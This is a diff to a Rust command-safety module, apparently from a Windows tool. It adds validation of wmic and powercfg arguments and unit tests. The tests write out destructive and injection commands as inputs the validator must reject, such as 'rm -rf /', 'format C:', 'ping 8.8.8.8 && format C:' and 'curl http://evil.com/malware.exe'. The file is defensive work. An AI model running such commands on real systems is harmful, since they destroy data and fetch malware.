@@ -33,13 +33,51 @@ fn blocked_commands() -> HashSet<&'static str> {
     ].into_iter().collect()
 }
 
-/// Caracteres suspects
+/// Caracteres suspects d'injection de commandes
 fn has_injection(cmd: &str) -> bool {
-    ["&&", "||", "|", ";", ">", ">>", "<", "`", "$(",].iter().any(|c| cmd.contains(c))
+    ["&&", "||", "|", ";", ">", ">>", "<", "`", "$("].iter().any(|c| cmd.contains(c))
+}
+
+/// Validation des arguments pour les commandes potentiellement dangereuses selon leurs arguments.
+/// `wmic` et `powercfg` sont whitelistés mais peuvent exécuter des actions destructives
+/// selon les sous-commandes passées — ce niveau valide les arguments, pas seulement le premier mot.
+fn validate_command_args(first_word: &str, args: &[&str]) -> Result<(), NiTriTeError> {
+    match first_word {
+        "wmic" => {
+            // Interdire les verbes WMIC qui modifient l'état système
+            let dangerous_verbs = ["call", "create", "delete", "set", "assoc"];
+            for arg in args {
+                let lower = arg.to_lowercase();
+                if dangerous_verbs.contains(&lower.as_str()) {
+                    return Err(NiTriTeError::CommandDenied(
+                        format!("wmic: sous-commande '{}' interdite (opération mutante)", arg)
+                    ));
+                }
+            }
+        }
+        "powercfg" => {
+            // Autoriser uniquement les sous-commandes de rapport/lecture
+            const ALLOWED: &[&str] = &[
+                "/batteryreport", "/energy", "/list", "/l",
+                "/query", "/q", "/getactivescheme", "/a",
+            ];
+            if let Some(first_arg) = args.first() {
+                let lower = first_arg.to_lowercase();
+                if !ALLOWED.iter().any(|a| lower == *a) {
+                    return Err(NiTriTeError::CommandDenied(
+                        format!("powercfg: argument '{}' non autorisé (lecture seule uniquement)", first_arg)
+                    ));
+                }
+            }
+        }
+        _ => {}
+    }
+    Ok(())
 }
 
 pub fn is_safe(command: &str) -> Result<(), NiTriTeError> {
-    let first_word = command.split_whitespace().next().unwrap_or("").to_lowercase();
+    let parts: Vec<&str> = command.split_whitespace().collect();
+    let first_word = parts.first().copied().unwrap_or("").to_lowercase();
 
     if blocked_commands().iter().any(|b| first_word == b.to_lowercase()) {
         return Err(NiTriTeError::CommandDenied(format!("Commande interdite: {}", first_word)));
@@ -53,7 +91,8 @@ pub fn is_safe(command: &str) -> Result<(), NiTriTeError> {
         return Err(NiTriTeError::CommandDenied(format!("Commande non autorisee: {}", first_word)));
     }
 
-    Ok(())
+    // Validation des arguments pour les commandes sensibles
+    validate_command_args(&first_word, &parts[1..])
 }
 
 pub fn execute_safe(command: &str) -> Result<SafeCommandResult, NiTriTeError> {
@@ -71,4 +110,117 @@ pub fn execute_safe(command: &str) -> Result<SafeCommandResult, NiTriTeError> {
         stdout: String::from_utf8_lossy(&output.stdout).to_string(),
         stderr: String::from_utf8_lossy(&output.stderr).to_string(),
     })
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ── Whitelist / Blacklist ──────────────────────────────────────────────────
+
+    #[test]
+    fn allows_safe_ipconfig() {
+        assert!(is_safe("ipconfig /all").is_ok());
+    }
+
+    #[test]
+    fn allows_safe_ping() {
+        assert!(is_safe("ping 8.8.8.8").is_ok());
+    }
+
+    #[test]
+    fn allows_wmic_readonly_query() {
+        assert!(is_safe("wmic cpu get name").is_ok());
+    }
+
+    #[test]
+    fn allows_powercfg_batteryreport() {
+        assert!(is_safe("powercfg /batteryreport").is_ok());
+    }
+
+    #[test]
+    fn allows_powercfg_list() {
+        assert!(is_safe("powercfg /list").is_ok());
+    }
+
+    // ── Blacklist absolue ─────────────────────────────────────────────────────
+
+    #[test]
+    fn blocks_rm() {
+        assert!(is_safe("rm -rf /").is_err());
+    }
+
+    #[test]
+    fn blocks_del() {
+        assert!(is_safe("del C:\\Windows\\System32").is_err());
+    }
+
+    #[test]
+    fn blocks_shutdown() {
+        assert!(is_safe("shutdown /s /t 0").is_err());
+    }
+
+    #[test]
+    fn blocks_format() {
+        assert!(is_safe("format C:").is_err());
+    }
+
+    #[test]
+    fn blocks_bcdedit() {
+        assert!(is_safe("bcdedit /set safeboot minimal").is_err());
+    }
+
+    // ── Injection ─────────────────────────────────────────────────────────────
+
+    #[test]
+    fn blocks_pipe_injection() {
+        assert!(is_safe("ipconfig | del important.txt").is_err());
+    }
+
+    #[test]
+    fn blocks_and_injection() {
+        assert!(is_safe("ping 8.8.8.8 && format C:").is_err());
+    }
+
+    #[test]
+    fn blocks_redirect_injection() {
+        assert!(is_safe("ipconfig > C:\\evil.txt").is_err());
+    }
+
+    #[test]
+    fn blocks_subshell_injection() {
+        assert!(is_safe("ping $(whoami)").is_err());
+    }
+
+    // ── Validation arguments (commandes sensibles) ────────────────────────────
+
+    #[test]
+    fn blocks_wmic_process_create() {
+        assert!(is_safe("wmic process call create calc.exe").is_err());
+    }
+
+    #[test]
+    fn blocks_wmic_delete() {
+        assert!(is_safe("wmic process where name='virus.exe' delete").is_err());
+    }
+
+    #[test]
+    fn blocks_wmic_set() {
+        assert!(is_safe("wmic service where name='spooler' set startmode=disabled").is_err());
+    }
+
+    #[test]
+    fn blocks_powercfg_hibernate_off() {
+        assert!(is_safe("powercfg /hibernate off").is_err());
+    }
+
+    #[test]
+    fn blocks_powercfg_change() {
+        assert!(is_safe("powercfg /change standby-timeout-ac 0").is_err());
+    }
+
+    #[test]
+    fn blocks_unknown_command() {
+        assert!(is_safe("curl http://evil.com/malware.exe").is_err());
+    }
 }
